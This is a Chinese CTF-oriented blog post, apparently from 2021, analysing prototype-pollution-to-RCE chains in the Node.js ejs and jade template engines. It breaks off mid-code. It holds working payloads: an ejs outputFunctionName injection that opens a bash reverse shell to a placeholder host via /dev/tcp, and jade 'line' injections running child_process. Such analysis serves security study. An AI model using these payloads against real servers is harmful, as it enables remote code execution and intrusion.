@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x00 前言跟着网上文章分析复现一遍ejsRCE链,然后尝试自己探究一下jadeRCE链 RCE 的前提是要有原型链污染 lodash 原型链污染demo 1234567var _&#x3D; require(&amp;#x27;lodash&amp;#x27;);var malicious_payload &#x3D; &amp;#x27;&amp;#123;&quot;__proto__&quot;:&amp;#123;&quot;oops&amp;quot">
+<meta property="og:type" content="article">
+<meta property="og:title" content="几个node模板引擎的原型链污染分析">
+<meta property="og:url" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="L0nm4r|Blog">
+<meta property="og:description" content="0x00 前言跟着网上文章分析复现一遍ejsRCE链,然后尝试自己探究一下jadeRCE链 RCE 的前提是要有原型链污染 lodash 原型链污染demo 1234567var _&#x3D; require(&amp;#x27;lodash&amp;#x27;);var malicious_payload &#x3D; &amp;#x27;&amp;#123;&quot;__proto__&quot;:&amp;#123;&quot;oops&amp;quot">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613884853031.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613884939865.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613884975131.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613885027494.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613885129648.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613885150428.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613885224116.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613885294361.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613885416704.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613886363413.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613886398105.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613890867473.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613891162165.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613891209987.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613891248155.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613891301546.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613891409260.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613891512195.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613891640298.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613891684445.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613891751528.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613892764488.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613894266904.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613894409463.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613892847603.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613973792970.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613974028363.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613973894835.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613977699618.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613977799878.png">
+<meta property="article:published_time" content="2021-02-22T07:29:24.000Z">
+<meta property="article:modified_time" content="2021-02-22T07:30:35.000Z">
+<meta property="article:author" content="L0nm4r">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="nodejs">
+<meta property="article:tag" content="jade">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/1613884853031.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>几个node模板引擎的原型链污染分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <li><a href="/">首页</a></li><li><a href="/about/">关于</a></li><li><a href="/archives/">归档</a></li><li><a target="_blank" rel="noopener" href="https://github.com/L0nm4r">项目</a></li>
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/02/23/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E4%BA%86%E8%A7%A3PaddingOracleAttack&&CBC-Byte-Flipping-Attack/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2021/02/20/%E9%80%9A%E8%BF%87%E5%87%A0%E9%81%93%E9%A2%98%E7%9B%AE%E4%BA%86%E8%A7%A3pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/&text=几个node模板引擎的原型链污染分析"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/&title=几个node模板引擎的原型链污染分析"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/&is_video=false&description=几个node模板引擎的原型链污染分析"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=几个node模板引擎的原型链污染分析&body=Check out this article: http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/&title=几个node模板引擎的原型链污染分析"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/&title=几个node模板引擎的原型链污染分析"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/&title=几个node模板引擎的原型链污染分析"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/&title=几个node模板引擎的原型链污染分析"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/&name=几个node模板引擎的原型链污染分析&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-ejs"><span class="toc-number">2.</span> <span class="toc-text">0x01 ejs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-jade"><span class="toc-number">3.</span> <span class="toc-text">0x02 jade</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%85%88%E8%B4%B4%E4%B8%A4%E4%B8%AA%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.1.</span> <span class="toc-text">1.先贴两个利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">2. 利用链分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Ctfshow%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">3.3.</span> <span class="toc-text">3. Ctfshow题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%A1%AB%E5%9D%91"><span class="toc-number">3.4.</span> <span class="toc-text">4.填坑.</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">0x03 总结.</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">0x04 参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        几个node模板引擎的原型链污染分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">L0nm4r|Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2021-02-22T07:29:24.000Z" itemprop="datePublished">2021-02-22</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/ctf/" rel="tag">ctf</a>, <a class="tag-link-link" href="/tags/jade/" rel="tag">jade</a>, <a class="tag-link-link" href="/tags/nodejs/" rel="tag">nodejs</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>跟着网上文章分析复现一遍ejsRCE链,然后尝试自己探究一下jadeRCE链</p>
+<p>RCE 的前提是要有原型链污染</p>
+<p>lodash 原型链污染demo</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> malicious_payload = <span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;oops&quot;:&quot;It works !&quot;&#125;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Before : &quot;</span> + a.oops);</span><br><span class="line">_.merge(&#123;&#125;, <span class="built_in">JSON</span>.parse(malicious_payload));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;After : &quot;</span> + a.oops);</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x01-ejs"><a href="#0x01-ejs" class="headerlink" title="0x01 ejs"></a>0x01 ejs</h2><p>环境和调试代码参考 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7075#toc-5">https://xz.aliyun.com/t/7075#toc-5</a></p>
+<p>逐步跟踪找到渲染模板的compile函数,参考<a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">Express+lodash+ejs: 从原型链污染到RCE</a></p>
+<p>从index.js::res.render开始跟进</p>
+<p><img src="1613884853031.png" alt="1613884853031"></p>
+<p>进入到app.render</p>
+<p><img src="1613884939865.png" alt="1613884939865"></p>
+<p>然后进入到app.render里的tryrender函数</p>
+<p><img src="1613884975131.png" alt="1613884975131"></p>
+<p>view.render. </p>
+<p><img src="1613885027494.png" alt="1613885027494"></p>
+<p>然后看到在View.render开始渲染.从这个函数进入ejs模块</p>
+<p><img src="1613885129648.png" alt="1613885129648"></p>
+<p>继续跟进到renderFile.里面有tryHandleCache函数</p>
+<p><img src="1613885150428.png" alt="1613885150428"></p>
+<p>继续跟进到handleCache函数,</p>
+<p><img src="1613885224116.png" alt="1613885224116"></p>
+<p>在这找到了渲染模板的compile函数</p>
+<p><img src="1613885294361.png" alt="1613885294361"></p>
+<p>然后在这个函数里实例化了一个模板类,然后编译.</p>
+<p>继续跟踪编译函数</p>
+<p><img src="1613885416704.png" alt="1613885416704"></p>
+<p>可以发现几处关键代码, </p>
+<p>正常情况下<code>opts.outputFunctionName</code>为undefined.可以通过原型链污染控制其值,然后拼接到prepended.</p>
+<p>prepended在后面传递给了this.source.</p>
+<p><img src="1613886363413.png" alt="1613886363413"></p>
+<p>this.source在后面作为构造函数参数传递给fn</p>
+<p><img src="1613886398105.png" alt="1613886398105"></p>
+<p>fn最终通过fn.apply()被调用.</p>
+<p>所以控制opts.outputFunctionName就可以注入任意代码.</p>
+<p>payload:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-jade"><a href="#0x02-jade" class="headerlink" title="0x02 jade"></a>0x02 jade</h2><h3 id="1-先贴两个利用链"><a href="#1-先贴两个利用链" class="headerlink" title="1.先贴两个利用链"></a>1.先贴两个利用链</h3><p>这个之前见到了两个利用链,但是做ctfshow题目的时候都不能利用.</p>
+<p>先贴出利用链:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;self&quot;</span>:<span class="string">&quot;true&quot;</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;2,jade_debug[0].filename));return global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;)//&quot;</span>&#125;&#125;</span><br><span class="line"><span class="number">2.</span> </span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;)&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-利用链分析"><a href="#2-利用链分析" class="headerlink" title="2. 利用链分析"></a>2. 利用链分析</h3><p>参考 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></p>
+<ul>
+<li>环境搭建</li>
+</ul>
+<p>app.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> lodash= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, path.join(__dirname));</span><br><span class="line">app.engine(<span class="string">&#x27;jade&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;jade&#x27;</span>).__express);</span><br><span class="line">app.set(<span class="string">&quot;view engine&quot;</span>, <span class="string">&quot;jade&quot;</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json()).use(express.urlencoded(&#123;</span><br><span class="line">    extended: <span class="literal">false</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> malicious_payload = <span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;self&quot;:&quot;true&quot;,&quot;line&quot;:&quot;1000000,jade_debug[0].filename));return global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;)//&quot;&#125;&#125;&#x27;</span>;</span><br><span class="line">lodash.merge(&#123;&#125;, <span 